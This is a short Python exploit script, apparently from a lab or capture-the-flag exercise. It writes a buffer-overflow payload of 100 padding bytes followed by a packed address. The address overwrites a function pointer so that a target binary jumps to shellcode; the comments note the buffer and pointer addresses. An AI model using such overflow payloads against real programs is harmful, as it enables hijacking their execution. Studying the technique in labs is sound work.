import sys, struct

# addr buf: 0x56559040
# addr &f:  0x565590a4
# offset buf -> f = 0x64 = 100 bytes
# SHELLCODE addr (infinity shellcode, 2 bytes): 0xffffc5e8

sc_addr = 0xffffc5e8

payload = b"A" * 100 + struct.pack("<I", sc_addr)
sys.stdout.buffer.write(payload)
